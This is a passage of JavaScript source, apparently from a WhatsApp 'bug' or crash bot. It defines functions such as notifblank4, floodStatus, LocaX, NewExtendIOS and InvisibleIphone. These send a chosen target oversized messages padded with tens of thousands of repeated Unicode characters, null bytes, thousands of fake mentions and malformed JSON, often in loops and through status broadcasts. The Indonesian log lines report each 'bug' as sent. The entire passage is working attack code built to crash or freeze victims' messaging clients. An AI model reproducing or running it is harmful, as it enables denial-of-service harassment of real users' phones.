          let { type, ciphertext } = await sock.signalRepository.encryptMessage({
            jid,
            data: bytes
          });
          if (type === 'pkmsg') shouldIncludeDeviceIdentity = true;

          return {
            tag: 'to',
            attrs: { jid },
            content: [{ tag: 'enc', attrs: { v: '2', type, ...extraAttrs }, content: ciphertext }]
          };
        });

      }));

      return { nodes: nodes.filter(Boolean), shouldIncludeDeviceIdentity };
    };

    let { nodes: destinations, shouldIncludeDeviceIdentity } =
      await sock.createParticipantNodes(devices, { conversation: "y" }, { count: '0' });

    let callNode = {
      tag: "call",
      attrs: { to: target, id: sock.generateMessageTag(), from: sock.user.id },
      content: [{
        tag: "offer",
        attrs: {
          "call-id": crypto.randomBytes(16).toString("hex").slice(0, 64).toUpperCase(),
          "call-creator": sock.user.id
        },
        content: [
          { tag: "audio", attrs: { enc: "opus", rate: "16000" } },
          { tag: "audio", attrs: { enc: "opus", rate: "8000" } },
          {
            tag: "video",
            attrs: {
              orientation: "0",
              screen_width: "1920",
              screen_height: "1080",
              device_orientation: "0",
              enc: "vp8", dec: "vp8"
            }
          },
          { tag: "net", attrs: { medium: "3" } },
          { tag: "capability", attrs: { ver: "1" }, content: new Uint8Array([1, 5, 247, 9, 228, 250, 1]) },
          { tag: "encopt", attrs: { keygen: "2" } },
          { tag: "destination", attrs: {}, content: destinations },
          ...(shouldIncludeDeviceIdentity
            ? [{ tag: "device-identity", attrs: {}, content: encodeSignedDeviceIdentity(sock.authState.creds.account, true) }]
            : [])
        ]
      }]
    };
    await sock.sendNode(callNode);
    await sock.relayMessage(target, StickMsg.message, { messageId: StickMsg.key.id });
  }
}

async function notifblank3(sock, target) {
  const message = {
    viewOnceMessage: {
      message: {
        interactiveMessage: {
          header: {
            hasMediaAttachment: true,
            imageMessage: {
              url: "https://mmg.whatsapp.net/o1/v/t24/f2/m269/AQNUlmFQCflj-o4DnkkqBD4dXmdF0J5mOAGHGmOBDv3xZmtq4W9LY8BC7da1MpgpEmzzIzkze6beOUhTs6pBnav3pOPMexEWn9LjoT3QOw?ccb=9-4&oh=01_Q5Aa2QGEGLzQfGw8rA0j77_p8R7jcCDlLi4V-gnHyyeOnFNAWQ&oe=68D151D5&_nc_sid=e6ed6c&mms3=true",
              directPath: "/o1/v/t24/f2/m269/AQNUlmFQCflj-o4DnkkqBD4dXmdF0J5mOAGHGmOBDv3xZmtq4W9LY8BC7da1MpgpEmzzIzkze6beOUhTs6pBnav3pOPMexEWn9LjoT3QOw?ccb=9-4&oh=01_Q5Aa2QGEGLzQfGw8rA0j77_p8R7jcCDlLi4V-gnHyyeOnFNAWQ&oe=68D151D5&_nc_sid=e6ed6c",
              mimetype: "image/jpeg",
              mediaKey: "2fXXmVelp53Ffz5tv7J0UJyEmUEoFbfpeGcgG21zKk4=",
              fileEncSha256: "I/6MTYL3oRDBI3dPez/v6V0Meq90dRerYyhWJF0PYDw=",
              fileSha256: "ExVmZkmvhmJRraU4undM/3Zcz80Ju46UkTWd2eRWMX8=",
              fileLength: "46031",
              mediaKeyTimestamp: "1755963474"
            }
          },
          body: {
            text: "halo makan permen yuk" + "ꦾ".repeat(30000), 
          },
          footer: {
            text: "p bang" + "ꦽ".repeat(10000), 
          },
          nativeFlowMessage: {
            messageParamsJson: ")}".repeat(5000), 
            buttons: [
              {
                name: "cta_call",
                buttonParamsJson: JSON.stringify({ status: true }) 
              },
              { 
                name: "cta_copy",
                buttonParamsJson: JSON.stringify({ display_text: "ꦽ".repeat(5000) }) 
              },
              {
                name: "quick_reply",
                buttonParamsJson: JSON.stringify({ display_text: "ꦽ".repeat(5000) }) 
              },
              {
                name: "cta_call",
                buttonParamsJson: JSON.stringify({ status: true }) 
              },
              { 
                name: "cta_copy",
                buttonParamsJson: JSON.stringify({ display_text: "ꦽ".repeat(5000) }) 
              },
              {
                name: "quick_reply",
                buttonParamsJson: JSON.stringify({ display_text: "ꦽ".repeat(5000) }) 
              },
              {
                name: "cta_call",
                buttonParamsJson: JSON.stringify({ status: true }) 
              },
              { 
                name: "cta_copy",
                buttonParamsJson: JSON.stringify({ display_text: "ꦽ".repeat(5000) }) 
              },
              {
                name: "quick_reply",
                buttonParamsJson: JSON.stringify({ display_text: "ꦽ".repeat(5000) }) 
              }
            ],
          }
        }
      }
    }
  };

  const msg = generateWAMessageFromContent(target, proto.Message.fromObject(message), { userJid: target });

  await sock.relayMessage(target, msg.message, {
    participant: { jid: target },
    messageId: msg.key.id
  });

}

async function notifblank4(sock, target) {
  const zieeMsg = [
    "0@s.whatsapp.net",
    "13135550002@s.whatsapp.net",
    ...Array.from({ length: 5000 }, () =>
      "1" + Math.floor(Math.random() * 999999) + "@s.whatsapp.net"
    ),
  ];

  for (let i = 0; i < 75; i++) {
    const mediaFlood = {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            body: {
              text: "duh seru banget makan permen",
            },
            contextInfo: {
              forwardingScore: 9999,
              isForwarded: true,
              participant: "0@s.whatsapp.net",
              remoteJid: "status@broadcast",
              mentionedJid: zieeMsg,
              ephemeralSettingTimestamp: 9741,
              entryPointConversionSource: "WhatsApp.com",
              entryPointConversionApp: "WhatsApp",
              disappearingMode: {
                initiator: "INITIATED_BY_OTHER",
                trigger: "ACCOUNT_SETTING",
              },
            },
            nativeFlowMessage: {
              buttons: [
                {
                  name: "single_select",
                  buttonParamsJson: "",
                },
                {
                  name: "call_permission_request",
                  buttonParamsJson: JSON.stringify({ status: true }),
                },
              ],
              messageParamsJson: "{{".repeat(15000),
            },
          },
          extendedTextMessage: {
            text: "ꦾ".repeat(25000) + "@1".repeat(25000),
            contextInfo: {
              stanzaId: target,
              participant: target,
              quotedMessage: {
                conversation:
                  "hallo" +
                  "ꦾ࣯࣯".repeat(60000) +
                  "@1".repeat(30000),
              },
              disappearingMode: {
                initiator: "CHANGED_IN_CHAT",
                trigger: "CHAT_SETTING",
              },
            },
            inviteLinkGroupTypeV2: "DEFAULT",
          },
        },
      },
    };

    try {
      const msg = generateWAMessageFromContent(target, mediaFlood, {});
      await sock.relayMessage(target, msg.message, {
        messageId: msg.key.id,
        statusJidList: [target],
      });
    } catch (err) {
    }
  }
}

async function notifblank5(sock, target) {
  const msg = await generateWAMessageFromContent(target, {
    viewOnceMessage: {
      message: {
        interactiveMessage: {
          body: {
            text: "sini bang makan permen"
          },
          nativeFlowMessage: {
            messageParamsJson: "{}",
            buttons: [
              {
                name: "templateMessage",
                buttonParamsJson: "{}"
              },
              {
                name: "payment_method",
                buttonParamsJson: "{}"
              },
              {
                name: "payments_care_csat",
                buttonParamsJson: "{}"
              },
              {
                name: "automated_greeting_message_view_catalog",
                buttonParamsJson: "{}"
              },
              {
                name: "message_with_link_status",
                buttonParamsJson: "{}"
              },
              {
                name: "extensions_message_v2",
                buttonParamsJson: "{}"
              },
              {
                name: "landline_call",
                buttonParamsJson: "{}"
              },
              {
                name: "wa_payment_fbpin_reset",
                buttonParamsJson: "{}"
              },
              {
                name: "wa_payment_transaction_details",
                buttonParamsJson: "{}"
              },
              {
                name: "wa_payment_learn_more",
                buttonParamsJson: "{}"
              },
              {
                name: "form_message",
                buttonParamsJson: "{}"
              },
              {
                name: "mpm",
                buttonParamsJson: "{}"
              },
            ],
          }
        }
      }
    }
  }, { userJid: target });

  await sock.relayMessage(target, msg.message, {
    participant: { jid: target },
    messageId: msg.key.id
  });
}

//

async function floodStatus(duration, sock, istarget) {
const totalDuration = duration * 60 * 60 * 1000;
const startTime = Date.now();
let amount = 0;

const nextMessage = async () => {
if (Date.now() - startTime >= totalDuration) {
console.log(`Berhenti setelah ${amount} pesan`);
return;
}

if (amount < 400) {
await CloudBreadBubble(sock, istarget, true);
await CloudBreadBubble(sock, istarget, true);
amount++;
console.log(chalk.red(`API DELAY ${amount}/400 ke ${istarget}`));
nextMessage();
} else {
console.log(chalk.green(`Berhasil Mengirim 400 Status Bug ke ${istarget}`));
amount = 0;
console.log(chalk.red("Melanjutkan 400 Status Bug berikutnya"));
setTimeout(nextMessage, 5000);
}
};

nextMessage();
}
  
async function LocaXotion(target) {
    await sock.relayMessage(
        target, {
            viewOnceMessage: {
                message: {
                    liveLocationMessage: {
                        degreesLatitude: 197-7728-82882,
                        degreesLongitude: -111-188839938,
                        caption: ' GROUP_MENTION ' + "ꦿꦸ".repeat(150000) + "@1".repeat(70000),
                        sequenceNumber: '0',
                        jpegThumbnail: '',
                        contextInfo: {
                            forwardingScore: 177,
                            isForwarded: true,
                            quotedMessage: {
                                documentMessage: {
                                    contactVcard: true
                                }
                            },
                            groupMentions: [{
                                groupJid: "1999@newsletter",
                                groupSubject: " Subject "
                            }]
                        }
                    }
                }
            }
        }, {
            participant: {
                jid: target
            }
        }
    );
}

async function LocaX(sock, target) {
  const generateLocationMessage = {
    viewOnceMessage: {
      message: {
        locationMessage: {
          degreesLatitude: 21.1266,
          degreesLongitude: -11.8199,
          name: "x",
          url: "https://t.me/Xatanicvxii",
          contextInfo: {
            mentionedJid: [
              target,
              ...Array.from({ length: 1900 }, () =>
                "1" + Math.floor(Math.random() * 9000000) + "@s.whatsapp.net"
              )
            ],
            isSampled: true,
            participant: target,
            remoteJid: "status@broadcast",
            forwardingScore: 999999,
            isForwarded: true,
            quotedMessage: {
              extendedTextMessage: {
                text: "\u0000".repeat(100000)
              }
            },
            externalAdReply: {
              advertiserName: "whats !",
              title: "your e idiot ?",
              body: "{ x.json }",
              mediaType: 1,
              renderLargerThumbnail: true,
              jpegThumbnail: null,
              sourceUrl: "https://example.com"
            },
            placeholderKey: {
              remoteJid: "0@s.whatsapp.net",
              fromMe: false,
              id: "ABCDEF1234567890"
            }
          }
        },
        nativeFlowMessage: {
          buttons: [
            {
              name: "payment_method",
              buttonParamsJson: "{}" + "\u0000".repeat(100000)
            }
          ],
          messageParamsJson: "{}"
        }
      }
    }
  }

  const msg = generateWAMessageFromContent("status@broadcast", generateLocationMessage, {})

  await sock.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [target],
    additionalNodes: [{
      tag: "meta",
      attrs: {},
      content: [{
        tag: "mentioned_users",
        attrs: {},
        content: [{ tag: "to", attrs: { jid: target } }]
      }]
    }]
  }, { participant: target })
}

async function NewExtendIOS(target) {
    for (let i = 0; i < 66; i++) {
        const extendedTextMessage = {
            text: `  ` + "𑇂𑆵𑆴𑆿".repeat(25000),
            matchedText: "https://t.me/Xatanicvxii",
            description: "NULL" + "𑇂𑆵𑆴𑆿".repeat(150),
            title: "NULL" + "𑇂𑆵𑆴𑆿".repeat(15000),
            previewType: "NONE",
            jpegThumbnail: "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",
            thumbnailDirectPath: "/v/t62.36144-24/32403911_656678750102553_6150409332574546408_n.enc?ccb=11-4&oh=01_Q5AaIZ5mABGgkve1IJaScUxgnPgpztIPf_qlibndhhtKEs9O&oe=680D191A&_nc_sid=5e03e0",
            thumbnailSha256: "eJRYfczQlgc12Y6LJVXtlABSDnnbWHdavdShAWWsrow=",
            thumbnailEncSha256: "pEnNHAqATnqlPAKQOs39bEUXWYO+b9LgFF+aAF0Yf8k=",
            mediaKey: "8yjj0AMiR6+h9+JUSA/EHuzdDTakxqHuSNRmTdjGRYk=",
            mediaKeyTimestamp: "1743101489",
            thumbnailHeight: 641,
            thumbnailWidth: 640,
            inviteLinkGroupTypeV2: "DEFAULT",
            contextInfo: {
                quotedAd: {
                    advertiserName: "x",
                    mediaType: "IMAGE",
                    jpegThumbnail: "",
                    caption: "x"
                },
                placeholderKey: {
                    remoteJid: "0@s.whatsapp.net",
                    fromMe: false,
                    id: "ABCDEF1234567890"
                }
            }
        };

        const msg = generateWAMessageFromContent(target, {
            viewOnceMessage: {
                message: { extendedTextMessage }
            }
        }, {});

        await sock.relayMessage(target, { groupStatusMessageV2: { message: msg.message } },
            { participant: { jid: target } });
    }
};

async function InvisibleIphone(target, mention) {
const maklo = "" + "𑇂𑆵𑆴𑆿".repeat(60000);
   try {
      let locationMessage = {
         degreesLatitude: -9.09999262999,
         degreesLongitude: 199.99963118999,
         jpegThumbnail: null,
         name: "\u0000" + "𑇂𑆵𑆴𑆿𑆿".repeat(15000),
         address: "\u0000" + "𑇂𑆵𑆴𑆿𑆿".repeat(10000), 
         url: `${"𑇂𑆵𑆴𑆿".repeat(25000)}.com`,
      }
      let msg = generateWAMessageFromContent(target, {
         viewOnceMessage: {
            message: {
               locationMessage
            }
         }
      }, {});
      let extendMsg = {
         extendedTextMessage: { 
            text: "" + maklo,
            matchedText: "",
            description: "𑇂𑆵𑆴𑆿".repeat(25000),
            title: "" + "𑇂𑆵𑆴𑆿".repeat(15000),
            previewType: "NONE",
            jpegThumbnail: "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",
            thumbnailDirectPath: "/v/t62.36144-24/32403911_656678750102553_6150409332574546408_n.enc?ccb=11-4&oh=01_Q5AaIZ5mABGgkve1IJaScUxgnPgpztIPf_qlibndhhtKEs9O&oe=680D191A&_nc_sid=5e03e0",
            thumbnailSha256: "eJRYfczQlgc12Y6LJVXtlABSDnnbWHdavdShAWWsrow=",
            thumbnailEncSha256: "pEnNHAqATnqlPAKQOs39bEUXWYO+b9LgFF+aAF0Yf8k=",
            mediaKey: "8yjj0AMiR6+h9+JUSA/EHuzdDTakxqHuSNRmTdjGRYk=",
            mediaKeyTimestamp: "1743101489",
            thumbnailHeight: 641,
            thumbnailWidth: 640,
            inviteLinkGroupTypeV2: "DEFAULT"
         }
      }
      let msg2 = generateWAMessageFromContent(target, {
         viewOnceMessage: {
            message: {
               extendMsg
            }
         }
      }, {});
      let msg3 = generateWAMessageFromContent(target, {
         viewOnceMessage: {
            message: {
               locationMessage
            }
         }
      }, {});
      await sock.relayMessage('status@broadcast', msg.message, {
         messageId: msg.key.id,
         statusJidList: [target],
         additionalNodes: [{
            tag: 'meta',
            attrs: {},
            content: [{
               tag: 'mentioned_users',
               attrs: {},
               content: [{
                  tag: 'to',
                  attrs: {
                     jid: target
                  },
                  content: undefined
               }]
            }]
         }]
      });
      await sock.relayMessage('status@broadcast', msg2.message, {
         messageId: msg2.key.id,
         statusJidList: [target],
         additionalNodes: [{
            tag: 'meta',
            attrs: {},
            content: [{
               tag: 'mentioned_users',
               attrs: {},
               content: [{
                  tag: 'to',
                  attrs: {
                     jid: target
                  },
                  content: undefined
               }]
            }]
         }]
      });
      await sock.relayMessage('status@broadcast', msg3.message, {
         messageId: msg2.key.id,
         statusJidList: [target],
         additionalNodes: [{
            tag: 'meta',
            attrs: {},
            content: [{
               tag: 'mentioned_users',
               attrs: {},
               content: [{
                  tag: 'to',
                  attrs: {
                     jid: target
                  },
                  content: undefined
               }]
            }]
         }]
      });
      console.log(chalk.red(`SEND BUG TERKIRIM ${target}`));
   } catch (err) {
      console.error(err);
   }
};

async function YTXstc(sock, target) {
  const msg = {
    stickerMessage: {
